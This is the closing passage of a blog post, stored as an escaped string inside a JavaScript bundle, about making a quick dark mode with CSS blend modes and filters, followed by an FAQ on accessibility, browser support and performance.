upload component is custom, not related to Vuetify\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-batch-dark.png\\" caption=\\"Blend mode covers all parts of the app\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-stats-light.png\\" caption=\\"Charts are built with Charts.js\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-stats-dark.png\\" caption=\\"Charts also look okay\\"%}\\n</div> --\x3e\\n\\n## Conclusion\\nAll in all, it took around two hours to create this dark theme. Most of the time was\\nspent experimenting with different settings to get acceptable contrast ratios.\\nThere are probably better ways of doing this, but this was incredibly quick,\\nand allowed us to deliver something we normally wouldn\'t be able to deliver.\\nOther than the shadows, nothing is particularly ugly, so we consider this a success.\\nThe whole style sheet is just a couple of selectors :\\n\\n\\n```css\\nhtml.dark-mode {\\n    mix-blend-mode: difference;\\n    filter: brightness(0.67) hue-rotate(180deg);\\n    font-weight: 700 !important;\\n}\\n\\n/* Glow for dropdown/card-hover*/\\n.dark-mode .v-menu__content,\\n.dark-mode .v-card--hover:hover {\\n    box-shadow: 0 5px 20px rgba(142, 255, 252, 0.74);\\n}\\n\\n.dark-mode .logo {\\n    filter: brightness(0);\\n}\\n```\\n\\nThanks for reading!\\n\\n## FAQ\\n\\n*\u201cMany CSS frameworks have a dark-mode, why not use that?\u201d*\\\\\\\\\\nVuetify also has a dark-mode. Most of the components they offer look okay in dark-mode, but we would have\\nto write custom CSS for our own components, and for other libraries we\u2019re using (primarily for charts).\\nThe great thing about the blend-mode hack is that is operates independently of any framework.\\nYou set it on an HTML tag and it treats everything the same way.\\n\\n*\u201cWhat about accessibility?\u201d*\\\\\\\\\\nYeah, this isn\'t great for accessibility. Since we\'re lowering the brightness to 67% we\'re losing a lot of contrast.\\nWe increased the font-weight to mitigate the effects of this, but you shouldn\'t use this technique for your primary theme.\\n\\n*\u201cWhat about browser support?\u201d*\\\\\\\\\\nSupported in modern browsers, except Edge.\\nThere\'s a [detailed table](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode#Browser_Compatibility) available on MDN.\\n\\n*\u201cWhat about performance?\u201d*\\\\\\\\\\nWe haven\'t had any problems with performance, but some readers noted that they tried\\nthe trick on a complex website (Jira), which resulted in sluggish behavior."}]}')}}]);